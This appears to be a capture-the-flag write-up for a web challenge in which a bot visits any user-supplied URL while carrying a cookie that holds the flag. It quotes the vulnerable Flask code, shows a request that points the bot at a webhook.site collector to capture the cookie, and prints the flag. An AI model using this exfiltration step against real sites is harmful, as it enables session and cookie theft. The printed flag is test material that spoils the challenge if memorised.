# Web Lover

category: web

> Guess blahaj's favourite website and he will give you the flag!

We are given the website and the source code. Looking into the source code, we see that it visits a site and adds a cookie, and that we are supposed to steal the cookie:
```py
@app.route("/visit")
def visit():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    with webdriver.Chrome() as driver:
        driver.get("http://127.0.0.1:50100")
        driver.add_cookie({"name": "favorite_site", "value": os.environ["flag"]})
        try:
            driver.get(request.args.get("site"))
            return "Visited"
        except:
            return "Invalid URL"
```

We simply go to `/visit?site=https://webhook.site/<insert your id>` and we receive the header: `cookie: favorite_site=blahaj{x55_exi5t5_n0t_ju5t_in_scr1pt}`